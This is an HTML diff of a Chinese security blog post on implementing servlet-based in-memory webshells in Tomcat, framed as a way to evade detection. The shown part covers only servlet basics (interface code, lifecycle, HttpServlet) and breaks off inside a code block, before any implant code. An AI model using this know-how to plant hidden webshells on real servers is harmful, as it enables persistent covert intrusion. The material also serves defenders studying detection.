@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="​        除了通过Filter实现的内存马，也可以使用servlet，listener等实现内存马，不同的实现方式需要不同的查杀方式，有可能使用不同类型的内存马就可以绕过查杀，本片文章将带着大家了解servlet的入门、tomcat下servlet的实现、servlet内存马的实现。 servlet基础入门什么是servlet?servlet基本介绍​        servlet是一个J">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马实现原理解析-servlet内存马">
+<meta property="og:url" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="藏青&#39;s BLOG">
+<meta property="og:description" content="​        除了通过Filter实现的内存马，也可以使用servlet，listener等实现内存马，不同的实现方式需要不同的查杀方式，有可能使用不同类型的内存马就可以绕过查杀，本片文章将带着大家了解servlet的入门、tomcat下servlet的实现、servlet内存马的实现。 servlet基础入门什么是servlet?servlet基本介绍​        servlet是一个J">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231105141162.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113046827.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113147029.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113326086.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113716361.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231115816760.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231135749685.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231143118256.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231142000181.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144016548.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231144029960.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231152513184.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231153355218.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160006153.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160647998.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161437760.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161805758.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231162057960.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163240379.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163419357.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164001104.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164027686.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231165925365.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170148864.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170927517.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231171846938.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172858261.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172956381.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231173956853.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231174828367.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175039952.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175138329.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104110344314.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104112628640.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144102396.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144140687.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113652212.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113753731.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113819306.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115103558.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115418557.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104120216543.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104134133813.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144759287.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141540768.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141837343.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104142155491.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150812155.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150927298.png">
+<meta property="article:published_time" content="2020-12-31T02:25:16.000Z">
+<meta property="article:modified_time" content="2021-01-04T08:22:43.235Z">
+<meta property="article:author" content="藏青">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="SHELL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231105141162.png">
+
+<link rel="canonical" href="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Tomcat内存马实现原理解析-servlet内存马 | 藏青's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">藏青's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tomcat内存马实现原理解析-servlet内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-12-31 10:25:16" itemprop="dateCreated datePublished" datetime="2020-12-31T10:25:16+08:00">2020-12-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-04 16:22:43" itemprop="dateModified" datetime="2021-01-04T16:22:43+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>​        除了通过Filter实现的内存马，也可以使用servlet，listener等实现内存马，不同的实现方式需要不同的查杀方式，有可能使用不同类型的内存马就可以绕过查杀，本片文章将带着大家了解servlet的入门、tomcat下servlet的实现、servlet内存马的实现。</p>
+<h2 id="servlet基础入门"><a href="#servlet基础入门" class="headerlink" title="servlet基础入门"></a>servlet基础入门</h2><h3 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h3><h4 id="servlet基本介绍"><a href="#servlet基本介绍" class="headerlink" title="servlet基本介绍"></a>servlet基本介绍</h4><p>​        servlet是一个Java应用程序，运行在服务器端，用来处理客户端请求并作出响应的程序。servlet没有main方法不能独立运行，需要使用servlet容器比如tomcat来创建。当我们通过URL来访问servlet，首先会在servlet容器中判断该URL是由哪个servlet处理的，当前容器中是否有这个servlet实例，如果没有则创建servlet实例，并交由对应servlet的service方法来处理请求，处理结束后再返回web服务器。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231105141162.png" alt="image-20201231105141162"></p>
+<p>​        servlet接口分别有如下几个方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException</span>; <span class="comment">// init方法，创建好实例后会被立即调用，仅调用一次。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>;<span class="comment">//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest var1, ServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException</span>;  <span class="comment">//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。</span></span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getServletInfo</span><span class="params">()</span></span>;<span class="comment">//返回有关servlet的信息，如作者、版本和版权.</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;<span class="comment">//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" title="servlet生命周期"></a>servlet生命周期</h4><p>​        实例化：在第一次访问或启动tomcat时，tomcat会调用此无参构造方法实例化servlet。默认情况下在tomcat开启的时候不会实例化我们自定义的servlet，当我们第一次访问该servlet的时候才会去创建实例。org.apache.catalina.core.DefaultInstanceManager#newInstance(java.lang.String)</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113046827.png" alt="image-20201231113046827"></p>
+<p>​        初始化：tomcat在实例化此servlet后，会立即调用init方法初始化servlet。org.apache.catalina.core.StandardWrapper#initServlet</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113147029.png" alt="image-20201231113147029"></p>
+<p>就绪：容器收到请求后调用servlet的service方法来处理请求。org.apache.catalina.core.ApplicationFilterChain#internalDoFilter，servlet.service()方法会在过滤器链执行结束后执行。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113326086.png" alt="image-20201231113326086"></p>
+<p>销毁：容器依据自身算法删除servlet对象，删除前会调用destory方法，重写destroy方法，关闭tomcat时会执行servlet的destory方法。</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231113716361.png" alt="image-20201231113716361"></p>
+<p>​    总体过程如下所示：</p>
+<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231115816760.png" alt="image-20201231115816760"></p>
+<h4 id="servlet实现类介绍"><a href="#servlet实现类介绍" class="headerlink" title="servlet实现类介绍"></a>servlet实现类介绍</h4><p><strong>GenericServlet</strong></p>
+<p>​        GenericServlet是Servlet 接口和 ServletConfig 接口的实现类. 但是一个抽象类，其中的 service 方法为抽象方法。也就是说如果继承了这个抽象类，只有service方法是必须重写的。</p>
+<p><strong>HttpServlet</strong></p>
+<p>​        HttpServlet是GenericServlet的子类，在HttpServlet中对GenericServlet进行了扩展重写了service方法，根据不同的请求方式，调用不同的方法处理请求。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 